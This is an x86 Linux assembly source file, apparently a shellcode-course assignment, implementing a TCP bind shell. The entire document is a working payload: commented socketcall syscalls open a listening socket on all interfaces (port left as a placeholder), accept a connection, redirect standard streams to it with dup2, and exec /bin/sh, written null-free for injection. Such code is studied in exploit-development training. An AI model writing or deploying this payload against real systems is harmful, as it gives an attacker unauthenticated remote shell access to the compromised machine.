; SLAE - Assignment 1
;
; Shell Bind TCP
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE;

global _start			

section .text
_start:

    ; Linux Syscall Reference
    ; http://syscalls.kernelgrok.com/


    ; 1. socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = listenfd
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    push ecx        ; NULL terminate args list
    mov cl, 6       ; IPPROTO_TCP (6)
    push ecx
    xor ecx, ecx
    mov cl, 1       ; SOCK_STREAM (1) - in socket.h
    push ecx
    xor ecx, ecx
    mov cl, 2       ; PF_INET (2) - IP PROTO FAMILY
    push ecx
    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 1       ; socketcall type of call: SYS_SOCKET (1) 
    push 102
    pop eax         ; socketcall syscall
    int 0x80
    mov edx, eax    ; listenfd is returned in eax. Save into edx    

    ; 2. bind(listenfd, {sa_family=AF_INET, sin_port=htons(4444), \
    ;       sin_addr=inet_addr("0.0.0.0")}, 16)
    ;struct sockaddr_in {
    ;    short            sin_family;   // e.g. AF_INET, AF_INET6
    ;    unsigned short   sin_port;     // e.g. htons(3490)
    ;    struct in_addr   sin_addr;     // see struct in_addr, below
    ;    char             sin_zero[8];  // zero this if you want to
    ;};
    ;struct in_addr {
    ;    unsigned long s_addr;          // load with inet_pton()
    ;};
    xor ecx, ecx    ; Construct sockaddr structure on the stack
    push ecx        ; inet_addr - 0.0.0.0 - INADDR_ANY
    push word <PORT>; 16 bits - port number
    push word 2     ; family - AF_INET (2)
    mov ecx, esp    ; pointer to args

    push byte 0x10  ; Address length - 16 bytes
    push ecx        ; Pointer to sockaddr_in structure
    push edx        ; listenfd from socket call

    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 2       ; socketcall type of call: SYS_BIND (2)
    xor eax, eax
    mov al, 102     ; socketcall syscall
    int 0x80

    ; 3. listen(listenfd, 1)
    push 1          ; max connections
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 4
    pop ebx         ; SYS_LISTEN (4)
    push 102
    pop eax         ; socketcall syscall
    int 0x80
 
    ; 4. accept(listenfd, 0, NULL) = connfd
    xor ecx, ecx
    push ecx        ; NULL
    push ecx        ; 0
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 5
    pop ebx         ; SYS_ACCEPT = 5
    push 102
    pop eax         ; socketcall syscall
    int 0x80        ; connfd will be in eax
    mov edx, eax    ; save new connection descriptor

    ; 5. dup2(connfd, 2), dup2(connfd, 1), dup2(connfd, 0)
    push 2
    pop ecx         ; ecx - newfd
    mov ebx, edx    ; edx - connfd, ebx - oldfd
    dup_loop:
    mov al, 63      ; dup2 syscall
    int 0x80
    dec ecx
    jns dup_loop    ; exit when signed (-1)
      
    ; 6. execve("/bin/sh", ["/bin/sh"], [/* 0 vars */])
	; PUSH the first null dword 
	xor eax, eax
	push eax

    ; PUSH //bin/sh (8 bytes) 
	push 0x68732f2f ; 'hs//'
	push 0x6e69622f ; 'nib/
	mov ebx, esp    ; EBX - 1st param - NULL terminated filename

	push eax        ; EDX - 3rd param - NULL terminated list of env variables
	mov edx, esp    ; NULL terminator must be set before setting the 2nd param!

	push ebx        ; ECX - 2nd param - array of argument strings
	mov ecx, esp

	mov al, 11      ; execve syscall
	int 0x80

